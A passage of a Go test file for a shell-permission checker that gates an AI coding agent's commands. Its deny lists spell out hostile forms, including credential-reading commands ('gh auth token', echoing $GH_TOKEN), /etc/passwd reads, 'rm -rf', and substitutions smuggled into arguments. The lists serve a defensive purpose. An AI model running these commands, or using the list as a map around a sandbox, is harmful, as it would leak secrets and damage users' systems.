package permission

import (
	"path/filepath"
	"strings"
	"testing"
)

type roCase struct {
	cmd  string
	want bool
}

func checkReadOnly(t *testing.T, cases []roCase) {
	t.Helper()
	for _, c := range cases {
		if got := ReadOnlyShell(c.cmd); got != c.want {
			t.Errorf("ReadOnlyShell(%q) = %v, want %v", c.cmd, got, c.want)
		}
	}
}

func TestReadOnlyGitForms(t *testing.T) {
	checkReadOnly(t, []roCase{
		{"git status", true},
		{"git log --no-ext-diff --no-textconv -n 5", true},
		{"git ls-files internal", true},
		{"git diff", true},
		{"git log -3 --oneline | head -2", true},
		{"git show HEAD~1:internal/x.go", true},
		{"git blame -L 1,5 f.go", true},
		{"git branch --list", true},
		{"git diff --stat", true},
		{"git log -p -1", true},
		{"git show HEAD", true},
		{"git diff --no-ext-diff --no-textconv", true},
		{"git show --no-textconv --text HEAD", true},
		{"git diff --no-index a b", true},
		{"git -C /tmp log", true},
		{"git -C /abs/repo status --short", true},
		{"git -C /abs/repo status --short | wc -l", true},
		{"git -C /abs/repo log --oneline -5", true},
		{"git -C /abs/repo diff --stat", true},
		{"git -C ~/repo status", true},
		{"git -C ../sibling status", true},
		{"git -C a -C b status", true},
		{"git --no-pager -C d log --oneline -3", true},
		{"git log -C", true},
		{"git grep -C 2 x", true},
	})
}

func TestReadOnlyGitRefused(t *testing.T) {
	cmds := []string{"git -c core.pager=x log", "git log --output=x", "git commit -m x", "git branch -D x", "git branch new",
		"GIT_EXTERNAL_DIFF=x git diff", "X=--output=f git log $X", "git --config-env=a=B log", "git log --exec-path=/x",
		"git log --out=x", "git grep -O foo", "git diff --no-index /etc/passwd x", "git diff /etc/passwd /etc/hosts",
		"git diff ~root", "git log --pager=x",
		"git -C /abs/repo -c core.pager=touch\\ /tmp/x log", "git -C /abs/repo diff --output=/tmp/x", "git -C /abs/repo branch new",
		"git -C /abs/repo stash", "git -C /abs/repo config user.name x", "GIT_PAGER=x git -C /abs/repo log",
		"git -C /etc diff passwd hosts", "git -C /etc diff --no-index passwd hosts", "git -C /abs/repo log -- /etc/passwd",
		"git -C /etc diff passwd -- hosts", "git -C /etc diff -- passwd hosts", "git -C /etc grep --no-index root",
		"git -C /etc grep --no-ind root", "git -C d --git-dir=/x status", "git -C d --work-tree=/x status",
		"git -C d --exec-path=/x status", "git diff --ext-diff", "git log --ext-diff", "git diff --textconv",
		"git show --textconv HEAD", "git diff --ext-d", "git show --textc HEAD", "git -C /abs/repo diff --ext-diff",
		"git -C /abs/repo log --ext-diff", "git -C /abs/repo diff --textconv", "git -C /abs/repo show --textconv", "git --exec-path=/x -C d status", "git --no-pager --exec-path=/x status",
		"git -C d -p log", "git -C d format-patch HEAD~1", "git -C d bundle create /tmp/b HEAD", "git -C d archive -o /tmp/a.tar HEAD",
		"git -C d tag x", "git -C d worktree add /tmp/w", "git -C d gc", "git -C d fetch", "git -C d pull",
		"git -C d submodule update", "git -C d difftool", "git -C d grep -O x", "GIT_DIR=/x git -C d status",
		"GIT_EXTERNAL_DIFF=x git -C d diff", "GIT_CONFIG_COUNT=1 git -C d log", "git -C", "git -C=d status", "git -Cd status"}
	for _, c := range cmds {
		if ReadOnlyShell(c) {
			t.Errorf("ReadOnlyShell(%q) = true, want false", c)
		}
	}
}

func TestReadOnlyTools(t *testing.T) {
	checkReadOnly(t, []roCase{
		{"claude-code agents diff", true},
		{"claude-code agents diff --verify x", true},
		{"claude-code agents diff --check", false},
		{"claude-code agents diff -check", false},
		{"claude-code agents find foo", true},
		{"claude-code memory recall x | head -5", true},
		{"claude-code network websearch --query q", true},
		{"claude-code agents ask x", false},
		{"claude-code doctor -h", true},
		{"claude-code review simplify -h", true},
		{"claude-code review simplify --help", true},
		{"claude-code doctor --fix -h", false},
		{"claude-code doctor -h x", false},
		{"claude-code doctor", false},
		{"claude-code memory update --catchup", false},
		{"claude-code gateway --overlay {}", false},
		{"go doc fmt.Println", true},
		{"go list -f {{.Dir}} ./...", true},
		{"go list -toolexec x ./...", false},
		{"go env GOPATH", true},
		{"go env -w GOFLAGS=x", false},
		{"go build ./...", false},
	})
}

func TestReadOnlyRenamedVerbs(t *testing.T) {
	checkReadOnly(t, []roCase{
		{"claude-code plan status --all", true},
		{"claude-code plan assumptions plan.md", true},
		{"claude-code plan goals --json", true},
		{"claude-code plan tick --range a..b", false},
		{"claude-code review assumptions", false},
		{"claude-code review goals", false},
		{"claude-code models preflight", true},
		{"claude-code models preflight --refresh", false},
		{"claude-code models preflight --discover p", false},
		{"claude-code models preflight --live", false},
		{"claude-code review quality --comments --format tsv internal", true},
		{"claude-code review quality --comments --output x", false},
		{"claude-code review simplify --fail", true},
		{"claude-code gateway resolve codex", true},
		{"claude-code agents resolve codex", false},
		{"claude-code configure agents x profile=y", false},
		{"claude-code memory fmt --own", false},
		{"claude-code gateway proxy --restart", false},
		{"claude-code clip --clear", false},
		{"claude-code vault get TAVILY_API_KEY", true},
		{"claude-code vault get TAVILY_API_KEY >/dev/null 2>&1", true},
		{"claude-code vault get X | head -1", true},
		{"claude-code vault ls", true},
		{"claude-code vault set X", false},
		{"claude-code vault rm X", false},
		{"claude-code vault delete X", false},
		{"claude-code vault get --key", true},
		{"claude-code vault get --key | cat", true},
		{"rtk claude-code vault get --key --secret", false},
		{"claude-code vault get -key -secret", false},
		{"claude-code vault get --key --secret=true", false},
		{"claude-code vault get NAME | wc -c", true},
		{"claude-code vault get NAME 2>/dev/null", true},
		{"claude-code vault get X > out.txt", false},
		{"claude-code vault get GH_TOKEN", true},
		{"claude-code vault get GH_TOKEN --secret", false},
		{"claude-code vault get GH_TOKEN -secret", false},
		{"claude-code vault get GH_TOKEN --secret=false", true},
		{"claude-code gateway resolve codex --secret", false},
	})
}

func TestReadOnlyReviewScope(t *testing.T) {
	checkReadOnly(t, []roCase{
		{"claude-code review scope --range HEAD~1..HEAD --caps", true},
		{"claude-code review scope --paths internal/agent,cmd --importers --format json", true},
		{"claude-code review scope --range HEAD^..HEAD | head -5", true},
		{"claude-code review scope --range --output=x", false},
		{"claude-code review scope --range -x", false},
		{"claude-code review scope --paths /etc", false},
		{"claude-code review scope --paths a,../b", false},
		{"claude-code review scope --repo /tmp/x --caps", false},
		{"claude-code review scope --format sarif", false},
		{"claude-code review scope --out x", false},
		{"claude-code review scope --range 'a;b'", false},
		{"claude-code memory report --label x", false},
	})
}

func TestReadOnlyShell(t *testing.T) {
	checkReadOnly(t, []roCase{
		{"rg foo internal && ls", true},
		{"rg --pre cat foo", false},
		{`rg "->" internal`, true},
		{"cat a > b", false},
		{"cat a 2>&1", true},
		{"cat a > /dev/null", true},
		{"cat a 2>/dev/null", true},
		{"cat <<EOF", false},
		{"cat $(rm x)", false},
		{"cat $(ls)", false},
		{"cat `ls`", false},
		{"ls; rm x", false},
		{"ls | tee x", false},
		{"sed -n 1,5p file.go", true},
		{"sed -i s/a/b/ file", false},
		{"tail -f log", false},
		{"time git status", true},
		{"FOO=1 git status", false},
		{"PATH=/x git status", false},
		{"bash -c 'ls'", false},
		{"mytool --help", true}, // --help and --version print and exit; only -h is limited to listed readers
		{"mytool --version", true},
		{"git --help", true}, {"go version", true}, {"rg --version", true}, {"claude-code --help", true},
		{"bash -h", false}, {"bash --help", true}, {"bash --version", true}, {"sh -h", false}, {"zsh -h", false},
		{"dash -h", false}, {"fish -h", false}, {"python3 -h", false}, {"python --version", true}, {"node -h", false},
		{"ruby --version", true}, {"perl -h", false}, {"awk -h", false}, {"env --help", false}, {"xargs -h", false},
		{"sudo -h", false}, {"echo 'touch denied.txt' | bash -h", false}, {"cat a | sh --version", true},
		{"echo x | python3 -h", false},
		{"go list -m golang.org/x/text@latest", true}, {"go list golang.org/x/text@v0.1.0", true},
		{"go list -m -versions golang.org/x/text", true}, {"go list -m -retracted x", true}, {"go list ./...", true},
		{"./mytool --help", false},
		{"rm --help x", false},
		{"", false}, {"  \t ", false}, {"ls #\nrm x", false}, {"ls\nrm x", false},
		{"ls && git commit -m x", false}, {"ls || rm x", false}, {"ls && cat a > b", false}, {"cat a | sh", false},
		{"cat a | xargs rm", false}, {"cat a | sed -i s/a/b/ f", false}, {"ls & rm x", false},
	})
}

// verifyAllowed are the forms a Pi leaf under a file deny runs: builds, vet, scoped tests, format checks and reads.
var verifyAllowed = []string{
	"go build ./...", "rtk go build ./...", "GOOS=linux go build ./...", "GOOS=windows go vet ./...",
	"CGO_ENABLED=0 GOARCH=arm64 go build ./...", "time go test ./pkg", "go vet ./internal/pi", "go test ./pkg",
	"go test -run '^TestX$' -count=1 ./pkg ./other", "go test -run=X -count 1 ./pkg", "go test -v -race ./pkg",
	"go test ./internal/hooks/...", "rtk go test ./pkg 2>&1 | tail -5", "go test ./pkg 2>&1", "cd /repo && go test ./pkg",
	"gofmt -l pkg", "gofmt -d -s a.go", "gofmt -l -e a.go b.go",
	"go build -o /dev/null ./...", "go build -o=/dev/null ./x",
	"git status", "rtk git diff", "cat a.go", "cat a.go 2>&1", "sed -n 1,5p a.go",
	"claude-code agents diff --check --path a.go", "claude-code agents diff --check --path a.go --path b.go",
	"go test -run '2>&1' ./pkg",
	// quoted operands keep their boundaries (second review, finding 6)
	"cd \"a b\"", "go test -run 'Test A' ./pkg", "go test -run 'a<b' ./pkg", "cd '2>&1'", "gofmt -l '2>&1'",
	"go test -count=1 -count=2 ./pkg", "go test ./pkg -run X", "go test -run ./pkg ./other", "time time go test ./x",
	"time rtk go test ./x", "GOOS= go build ./x", "cd ~", "cd a && cd .. && go test ./x/...", "rtk read a.go",
	"git --no-pager log -1", "git diff", "claude-code agents diff", "claude-code agents diff --check",
	"go list ./...", "claude-code agents find x",
}

// verifyDenied are every write, wrapper, whole-module test and look-alike the verify shell refuses.
var verifyDenied = []string{
	// whole module and package spellings (R16, finding 5)
	"go test ./...", "go test", "go test .", "go test ../...", "go test ./../x", "go test ./a/../b", "go test ./.../x",
	"go test github.com/edotau/claude-code/...", "go test all", "go test std", "go test cmd", "go test /abs/pkg",
	"go test example.com/m/pkg", "go vet ../...", "go build all", "go build ./", "go vet ./a//b",
	"cd /Users/x/.claude/internal && go test ../...",
	// flags: unknown, passthrough, missing values, booleans with values
	"go test -exec /bin/sh ./pkg", "go test -toolexec x ./pkg", "go test -c ./pkg", "go test -json ./pkg",
	"go test -o /tmp/x.test ./pkg", "go test -C /x ./pkg", "go test -overlay o.json ./pkg", "go test -modfile m ./pkg",
	"go test -coverprofile=c.out ./pkg", "go test -cpuprofile c ./pkg", "go test --count 1 ./pkg", "go test -- ./pkg",
	"go test ./pkg -args -test.coverprofile=x", "go test ./pkg -run", "go test -count ./pkg", "go test -count=x ./pkg",
	"go test -run= ./pkg", "go test -v=true ./pkg", "go test -race=false ./pkg", "go vet -vettool=/bin/sh ./pkg",
	"go vet -v ./pkg", "go build -v ./...", "go build -C /x ./...", "go build -toolexec x ./...",
	// -o: only the null device (finding 3)
	"go build -o pkg/bin ./...", "go build -o /tmp/x ./...", "go build -o /tmp/link/../x ./...", "go build -o ~/x ./...",
	"go build -o /dev/stdout ./...", "go build -o ./...", "go build -o '2>&1' ./x", "go test ./pkg '2>&1'",
	// gofmt (finding 8)
	"gofmt a.go", "gofmt -s a.go", "gofmt -w pkg", "gofmt -l -w pkg", "gofmt -lw pkg", "gofmt -w=true pkg", "gofmt -l",
	"gofmt -r 'a->b' -l a.go",
	// prefixes and wrappers
	"GOFLAGS=-exec=/bin/sh go test ./pkg", "FOO=1 go build ./...", "env GOOS=linux go build ./...", "LANG=C cat a.go",
	"TMPDIR=/x go build ./...", "rtk rtk go build ./...", "rtk bypass go build ./...", "rtk proxy go build ./...",
	"time -o t go test ./pkg", "time -p go test ./pkg", "nice go test ./pkg", "timeout 5 go test ./pkg",
	"sudo go test ./pkg", "echo pkg | xargs go build", "bash -c 'go build ./...'", "sh -c 'go build ./...'",
	"eval go build ./...", "exec go test ./pkg",
	// redirects, expansions, globs (findings 6, 7)
	"echo hi > other/a.txt", "go test ./pkg > out.txt", "go test ./pkg >> out", "go test ./pkg &> out", "cat * ",
	"cat a.go >/dev/null", "cat a.go 3>&1", "go test ./pkg 2>/dev/null", "go test ./pkg 1>&2", "go test ./pkg 2>&1>f",
	"go test ./pkg | tee out", "cat < a.go", "cat <<EOF", "cat <<< x", "diff <(cat a) b", "go build $(echo ./...)",
	"go test ./pkg; echo exit=$?", "go test $PKG", "go test ${PKG}", "go test `echo ./pkg`", "go test ./p{a,b}",
	"gofmt -l *.go", "go test ./pk?", "go test ./[ab]", "go test ./pkg \\\n> x",
	// separators keep every segment judged
	"go build ./... ; rm -rf pkg", "go vet ./... && touch other/x", "go test ./pkg || rm x", "go test ./pkg & rm x",
	"go test ./pkg\nrm x", "go test ./pkg # ok\nrm x", "(go test ./pkg; rm x)", "{ go test ./pkg; rm x; }",
	// writers and other programs, read-only writer options included
	"rm -rf pkg", "touch x", "cp a b", "mv a b", "go run ./pkg", "go generate ./...", "go install ./...",
	"go mod tidy", "go get x", "go clean -cache", "make test", "rtk make lint", "git commit -m x", "git checkout x",
	"curl https://example.com", "sed -i s/a/b/ f", "find . -delete", "find . -exec rm {} ;", "rg --pre cat x",
	"tail -f log", "git diff --output=x", "git -c core.pager=sh log", "sort -o x y", "awk '{print}' a",
	"'go' test ./...", "g\\o test ./...", "$'go' test ./pkg", "./go test ./pkg", "/usr/bin/go run x",
	// claude-code: only agents diff (findings 1, 2)
	"claude-code agents ask --dry-run --agent pi x", "claude-code agents ask --dry-run --dry-run=false --agent pi x",
	"claude-code agents ask --system-prompt --dry-run --agent pi x", "claude-code agents ask --agent pi -- --dry-run",
	"claude-code agents ask --dry-run=true --agent pi x", "claude-code pi --print-env",
	"claude-code codex -- exec -- --print-env",
	"claude-code pi ask --tools --system-prompt --print-env x", "claude-code gemini --print-env",
	"claude-code agents diff --check --fix", "claude-code agents diff --check --path -x",
	"claude-code agents fix --path a",
	"claude-code agents diff --check --path a --secret", "claude-code vault get x --secret",
	// second review: shells behind a help flag (1), caller-chosen repositories (2), agents diff flags (3)
	"echo 'touch denied.txt' | bash -h", "bash -h", "sh -h", "zsh --version", "python3 -h", "mytool --help",
	"node --version", "python3 --version", "make --version", "bash --help", "cat a | sh --version",
	"git -C ./fixture diff", "git -C ./fixture log -p -1", "git -C. status", "git --git-dir=x log",
	"git --work-tree=x status", "git --namespace=x log", "git -c diff.external=x diff", "git --config-env=a=b log",
	"git --exec-path=x log", "rtk git -C x status", "git --no-pager -C x diff", "git -p log", "git --paginate log",
	"claude-code agents diff --verify x", "claude-code agents diff --base HEAD", "claude-code agents diff --gates test",
	"claude-code agents diff --check --gates test", "claude-code agents diff --check --base HEAD",
	"rtk claude-code agents diff --verify x",
	// go list fetches (5)
	"go list -m golang.org/x/text@latest", "go list -m -versions golang.org/x/text", "go list -m -retracted x",
	"go list -u -m all", "go list x@v1.0.0",
	// 2>&1 placement (6c) and glued forms
	"go test -run 2>&1 TestX ./pkg", "go build -o 2>&1 /dev/null ./x", "go test 2>&1 ./pkg", "go test ./pkg2>&1",
	"go test ./pkg 2>&12", "go test ./pkg 12>&1", "go test ./pkg 2>&1 >f", "go test ./pkg 2>&1 2>&1",
	// gofmt flags after a path (7) and write or profile forms
	"gofmt a.go -l", "gofmt -l a.go -w", "gofmt -d -w a.go", "gofmt -r 'a -> b' -w a.go", "gofmt -cpuprofile f -l a.go",
	// package edges, null-device variants, flag values
	"go test ./.", "go test .//x", "go test ./x/../y", "go test ./x/....", "go test ./...x", "go test ./x/",
	"go test '.\\x'", "go test \"./a b\"", "go build -o /dev/null/ ./x", "go build -o /dev/../dev/null ./x",
	"go build -o NUL ./x", "go build ./x -o", "go test -run ./pkg", "go test -count=-1 ./pkg", "go test -vet=off ./pkg",
	// prefixes, env, cd
	"rtk time go test ./x", "rtk gain", "GOOS=linux FOO=1 go build ./x", "GOOS=$(x) go build ./x", "cd -", "cd $HOME",
}

// A Pi leaf under a file deny builds, vets and runs scoped tests; any write, wrapper or whole-module test is refused.
func TestVerifyShell(t *testing.T) {
	for _, cmd := range verifyAllowed {
		if !VerifyShell(cmd) {
			t.Errorf("VerifyShell(%q) = false, want true", cmd)
		}
	}
	for _, cmd := range verifyDenied {
		if VerifyShell(cmd) {
			t.Errorf("VerifyShell(%q) = true, want false", cmd)
		}
	}
}

func TestReadOnlyRtkPrefix(t *testing.T) {
	checkReadOnly(t, []roCase{
		{"rtk git status", true}, {"rtk git -C /abs/repo status --short | wc -l", true},
		{"rtk git -C /abs/repo log --oneline -5", true}, {"rtk ls", true}, {"rtk grep -rn x .", true}, {"rtk rg x", true},
		{"rtk read f.go", true}, {"rtk read -n f.go", true}, {"rtk claude-code vault get NAME | wc -c", true},
		{"rtk find . -name y", true}, {"rtk find . -delete", false}, {"rtk go test ./...", false}, {"rtk make lint", false}, {"rtk proxy rm x", false},
		{"rtk run ls", false}, {"rtk rtk git status", false}, {"rtk git -C /abs/repo stash", false},
		{"rtk git diff --stat", true}, {"rtk git diff --ext-diff", false}, {"rtk git -C /abs/repo show --textconv", false},
		{"rtk git diff --output=/tmp/x", false}, {"rtk git -c core.pager=x log", false}, {"rtk rg --pre cat x", false},
		{"rtk claude-code vault get --key --secret", false}, {"rtk claude-code vault set X", false},
		{"rtk read /abs/file > /tmp/x", false}, {"rtk git -C /etc diff -- passwd hosts", false}, {"rtk", false}, {"rtk --help", true}, {"rtk -h", true}, {"git --help", true}, {"claude-code vault --help", true},
		{"rtk git --help", true}, {"rtk claude-code vault --help", true}, {"rtk git --help x", false},
	})
}

// With a Read deny present, a read-only shell command may not reach the denied path, or must be listable to prove it.
func TestReadOnlyShellHonorsReadDeny(t *testing.T) {
	p := Permissions{Allow: []Rule{ReadOnlyAllow}, Deny: append([]Rule{{Tool: "Read", Arg: ".env"}}, ReadOnlyDeny...)}
	for cmd, want := range map[string]Decision{
		"cat README.md": Allow, "cat .env": Deny, "cat sub/.env": Deny, "head -3 ./.env": Deny, "cat *.env": Deny,
		"cat $HOME/x": Deny, "wc -l a.go b.go": Allow, "git log -1": Allow, "git status": Allow, "git diff": Deny,
		"git show HEAD:.env": Deny, "git log -p": Deny, "rg foo": Deny, "grep -r foo .": Deny, "grep foo a.go": Allow,
		"sed -n 1,3p .env": Deny, "claude-code agents find x": Deny, "claude-code memory recall x": Allow,
		"go doc fmt": Allow, "git log --stat | head -3": Allow,
		"rtk read .env": Deny, "rtk read README.md": Allow, "rtk git -C .env status": Deny, "rtk git -C d status": Allow,
	} {
		if got := p.Decide("Bash", cmd); got != want {
			t.Errorf("%q = %v, want %v", cmd, got, want)
		}
	}
	if got := (Permissions{Allow: []Rule{ReadOnlyAllow}, Deny: ReadOnlyDeny}).Decide("Bash", "rg foo"); got != Allow {
		t.Errorf("rg with no Read deny = %v, want Allow", got)
	}
}

// A Read deny refuses only segments that may read it: cd elsewhere and echo pass, a cd into or above it does not.
func TestReadOnlyReadDenySparesNoFileSegments(t *testing.T) {
	root := filepath.ToSlash(t.TempDir())
	store, secret := root+"/memory", root+"/state/vault.db"
	base := []Rule{ReadOnlyAllow, {Tool: "Bash", Arg: "echo *"}, {Tool: "Bash", Arg: "printf *"}, {Tool: "Bash", Arg: "pwd"},
		{Tool: "Bash", Arg: "true"}, CdRule("/")}
	rows := map[string][2]Decision{ // command: {with the Read deny, without it}
		"cd " + store + " && wc -l f && echo done":    {Allow, Allow},
		"cd " + store + " && pwd && true && printf x": {Allow, Allow},
		"cat " + secret:                                {Deny, Allow},
		"cd " + store + " && cat " + secret:            {Deny, Allow},
		"head -1 " + secret + " | wc -c":               {Deny, Allow},
		"cd " + root + "/state && cat vault.db":        {Deny, Allow},
		"cd " + root + " && cat state/vault.db":        {Deny, Allow},
		"cd " + store + " && cat ../state/vault.db":    {Deny, Allow},
		"git -C " + secret + " status":                 {Deny, Allow},
		"git -C " + store + " status":                  {Allow, Allow},
		"cd memory && cat f":                           {Deny, Deny},
		"cd $HOME && cat f":                            {Deny, Deny},
		"cat $(echo " + secret + ")":                   {Deny, Ask},
		"cat " + root + "/state/vault$(git log -0).db": {Deny, Ask},
		"cat " + root + "/state/vault$(echo).db":       {Deny, Ask},
		"wc -l `echo " + secret + "`":                  {Deny, Ask},
		"grep x " + secret:                             {Deny, Allow},
		"grep -v '^$' f && grep -c '[0-9]' f":          {Allow, Allow},
		"grep '^$' '" + secret + "'":                   {Deny, Allow},
		"cat $'" + root + "/state/vault\\x2edb'":       {Deny, Deny},
		"grep \"$X\" f":                                {Deny, Deny},
		"cat ../x && head -5 memory/../memory/a.md":    {Allow, Allow},
	}
	for name, deny := range map[string]Rule{"absolute": {Tool: "Read", Arg: secret}, "glob": {Tool: "Read", Arg: "**/state/vault.db"}} {
		for cmd, want := range rows {
			with := Permissions{Mode: "plan", Allow: base, Deny: []Rule{deny}}
			if got := with.Decide("Bash", cmd); got != want[0] {
				t.Errorf("%s deny: %q = %v, want %v", name, cmd, got, want[0])
			}
			if got := (Permissions{Mode: "plan", Allow: base}).Decide("Bash", cmd); got != want[1] {
				t.Errorf("no deny: %q = %v, want %v", cmd, got, want[1])
			}
		}
		if got := (Permissions{Mode: "plan", Allow: base, Deny: []Rule{deny}}).DecideAt(root, "Bash", "cat state/vault.db"); got != Deny {
			t.Errorf("%s deny: DecideAt(root, cat state/vault.db) = %v, want Deny", name, got)
		}
	}
}

func TestReadOnlyBeatsAllow(t *testing.T) {
	p := Permissions{Allow: []Rule{{Tool: "Bash"}, ReadOnlyAllow}, Deny: ReadOnlyDeny}
	if got := p.Decide("Bash", "rm x"); got != Deny {
		t.Errorf("rm under a blanket allow = %v, want Deny", got)
	}
	if got := p.Decide("Bash", "ls"); got != Allow {
		t.Errorf("ls = %v, want Allow", got)
	}
	if got := p.Decide("Write", "x"); got != Deny {
		t.Errorf("Write = %v, want Deny", got)
	}
}

func TestParseRuleExpandsHome(t *testing.T) {
	t.Setenv("HOME", "/home/u")
	for rule, want := range map[string]string{"Edit(~/a/**)": "Edit(/home/u/a/**)", "Bash(~/x)": "Bash(~/x)", "Read(a/~/b)": "Read(a/~/b)",
		"Read(~)": "Read(~)", "Read(~root/x)": "Read(~root/x)", "WebFetch(~/x)": "WebFetch(~/x)"} {
		r, err := ParseRule(rule)
		if err != nil || r.String() != want {
			t.Errorf("ParseRule(%q) = %v, %v; want %s", rule, r, err, want)
		}
	}
	t.Setenv("HOME", "") // no home: the rule stays as written, never joined onto an empty home
	if r, err := ParseRule("Edit(~/a)"); err != nil || r.String() != "Edit(~/a)" {
		t.Errorf("ParseRule with no HOME = %v, %v; want Edit(~/a)", r, err)
	}
}

func TestReadOnlyAgentsWait(t *testing.T) {
	checkReadOnly(t, []roCase{
		{"claude-code agents wait job --timeout 10m", true},
		{"claude-code agents wait job --save /tmp/result", false},
		{"claude-code agents ask --waves plan --background", false},
	})
}

func TestReadOnlyAgentsMergedVerbs(t *testing.T) {
	checkReadOnly(t, []roCase{
		{"claude-code agents result -f job", true},
		{"claude-code agents result job --events -f", true},
		{"claude-code agents result job --agent codex", true},
		{"claude-code agents status", true},
		{"claude-code agents status job --agent codex --all", true},
		{"claude-code agents result job --save /tmp/x", false},
		{"claude-code agents cancel job", false},
		{"claude-code agents cancel --lost", false},
		{"claude-code agents tail job", false},
		{"claude-code agents reap", false},
	})
}

func TestReadOnlyGitReadForms(t *testing.T) {
	var rows []roCase
	for _, c := range []string{
		"git branch", "git branch -a", "git branch -r", "git branch -v", "git branch -vv", "git branch --list", "git branch -l",
		"git branch --show-current", "git branch --contains HEAD", "git branch --merged", "git branch --no-merged main",
		"git branch --format=%(refname) --sort=-committerdate", "git branch -a --list feat*", "git branch -r --merged main",
		"git remote", "git remote -v", "git remote show origin", "git remote get-url origin",
		"git worktree list", "git worktree list --porcelain",
		"git stash list", "git stash show", "git stash show -p stash@{1}",
		"git clean -n", "git clean --dry-run", "git clean -nd", "git clean -ndx", "git clean -fn", "git clean -f -d --dry-run",
		"git reflog", "git reflog -5", "git reflog show HEAD", "git reflog show --date=iso",
	} {
		rows = append(rows, roCase{c, true})
	}
	for _, c := range []string{
		"git branch new", "git branch -d x", "git branch -D x", "git branch -m a b", "git branch -M a b", "git branch -c a b",
		"git branch -C a b", "git branch -f x", "git branch --set-upstream-to=origin/x", "git branch -u origin/x",
		"git branch --unset-upstream", "git branch --edit-description", "git branch -v new", "git branch -a new",
		"git branch --list -D x", "git branch --show-current new", "git branch --delete x", "git branch --del x",
		"git remote add o u", "git remote remove o", "git remote rm o", "git remote rename a b", "git remote set-url o u",
		"git remote set-head o x", "git remote prune o", "git remote update", "git remote show ext::sh", "git remote get-url",
		"git remote -v add o u", "git remote show origin extra",
		"git worktree add /tmp/w", "git worktree remove w", "git worktree prune", "git worktree move a b", "git worktree lock w",
		"git worktree", "git worktree list --output=x",
		"git stash", "git stash push", "git stash pop", "git stash drop", "git stash apply", "git stash clear",
		"git stash branch x", "git stash create", "git stash store x", "git stash show --output=x",
		"git clean", "git clean -f", "git clean -fd", "git clean -fdx", "git clean -d", "git clean -n -i", "git clean -e x -n",
		"git clean --force", "git clean --no-dry-run", "git clean -i", "git clean -n -- /etc",
		"git reflog expire --all", "git reflog delete HEAD@{1}", "git reflog exists x", "git reflog HEAD",
		"git reflog show --output=x",
	} {
		rows = append(rows, roCase{c, false})
	}
	checkReadOnly(t, rows)
}

func TestReadOnlyFindEchoPrintf(t *testing.T) {
	checkReadOnly(t, []roCase{
		{`find . -name "*.go"`, true}, {"rtk find . -name '*.go'", true}, {"find . -type f -print0", true},
		{"find . -maxdepth 2 ( -name a -o -name b ) ! -path x -ls", true}, {"find . -newer a -print", true},
		{"find . -exec rm {} ;", false}, {"find . -execdir rm {} ;", false}, {"find . -ok rm {} ;", false},
		{"find . -okdir rm {} ;", false}, {"find . -delete", false}, {"find . -fprint out", false},
		{"find . -fprint0 out", false}, {"find . -fprintf out %p", false}, {"find . -fls out", false},
		{`find . -name x "-exec" rm`, false}, {`find . -name x \-delete`, false}, {"find . -name x | xargs rm", false},
		{"find . > out", false},
		{`echo "git reset --hard"`, true}, {`printf "%s" "rm -rf /"`, true}, {`echo hi; printf '%s\n' a`, true},
		{"echo hi > f", false}, {"echo $(rm x)", false}, {"echo `rm x`", false}, {"printf '%s\\n' a | sh", false},
		{"printf x >> f", false}, {"echo hi | tee f", false},
	})
}

func TestReadOnlyClusterCLIs(t *testing.T) {
	var rows []roCase
	for _, c := range []string{
		"kubectl get pods", "kubectl logs deployment/app", "kubectl describe pod x", "kubectl top pods", "kubectl version",
		"kubectl api-resources", "kubectl explain pod", "kubectl config get-contexts", "kubectl config current-context",
		"kubectl -n ns get pods", "kubectl --namespace ns get pods", "kubectl --namespace=ns get pods", "kubectl --context x get pods -o wide",
		"oc get pods", "oc -n ns logs x", "oc config current-context", "kubectl get pods | wc -l",
		"docker ps", "docker images", "docker logs x", "docker version", "docker info", "docker --context x ps",
		"docker --context=x ps -a",
		"gh pr view 42", "gh pr list", "gh pr status", "gh pr diff 42", "gh pr checks 42", "gh issue view 1", "gh issue list",
		"gh issue status", "gh repo view", "gh run view 1", "gh run list", "gh release view v1", "gh release list", "gh auth status",
		"aws --version", "aws help", "aws sts get-caller-identity", "gcloud --version", "gcloud version", "gcloud help",
		"gcloud config list",
	} {
		rows = append(rows, roCase{c, true})
	}
	for _, c := range []string{
		"kubectl", "kubectl config view", "kubectl config view --raw", "kubectl config use-context x", "kubectl config set x y",
		"kubectl apply -f x", "kubectl delete pod x", "kubectl exec x -- sh", "kubectl port-forward x 1", "kubectl cp a b",
		"kubectl edit x", "kubectl patch x", "kubectl run x", "kubectl auth can-i x", "kubectl create x",
		"kubectl get secret x -o yaml", "kubectl get secrets", "kubectl get cm,secret", "kubectl get secret/x", "kubectl describe secret x",
		"kubectl get pods --raw /api", "kubectl get pods -w", "kubectl logs x -f", "kubectl logs x --follow", "kubectl get pods --token x",
		"kubectl get pods --kubeconfig /x", "kubectl get pods --server https://x", "kubectl --kubeconfig /x get pods",
		"kubectl --server x get pods", "kubectl -n get pods", "kubectl -n --context get pods", "kubectl --as x get pods",
		"oc delete x", "oc whoami -t", "oc login", "oc config view",
		"docker inspect x", "docker run x", "docker rm x", "docker exec x sh", "docker build .", "docker pull x", "docker stop x", "docker logs -f x",
		"docker -H tcp://x ps", "docker --host x ps", "docker context use x", "docker --context ps",
		"gh api /user", "gh auth token", "gh auth login", "gh auth status --show-token", "gh auth status -t", "gh pr create",
		"gh pr merge 1", "gh pr checkout 1", "gh pr view 1 --web", "gh pr checks 1 --watch", "gh issue create", "gh repo clone x",
		"gh repo view -w", "gh run rerun 1", "gh release create v1", "gh release download v1", "gh -R a/b pr view 1", "gh",
		"aws", "aws s3 ls", "aws ec2 describe-instances", "aws sts get-session-token", "aws ecr get-login-password",
		"aws sts assume-role x", "aws configure list", "aws --profile x sts get-caller-identity",
		"gcloud auth print-access-token", "gcloud auth print-identity-token", "gcloud config set x y", "gcloud compute list",
		"gcloud auth list", "gcloud",
		"databricks auth token", "databricks clusters list", "databricks jobs delete 1",
		"env", "env FOO=1 ls", "printenv", "az account get-access-token",
	} {
		rows = append(rows, roCase{c, false})
	}
	checkReadOnly(t, rows)
}

// Expansion, assignments, printf -v and an env printer anywhere are refused; the ordinary reads beside them pass.
func TestReadOnlyHardening(t *testing.T) {
	var rows []roCase
	for _, c := range []string{
		`echo "$GH_TOKEN"`, "printf %s $ANTHROPIC_API_KEY", "echo ${HOME}", `echo $'\x41'`, "echo $((1+2))", `echo "a$b"`,
		"printf -v 'a[$(id)]' x", "printf -v x y", "printf -vx y",
		"find . -{exec,x} rm {} +", "find . -d{elete,}", "kubectl get sec{ret,}", "kubectl get {secret,pods}", "cat f{1..3}",
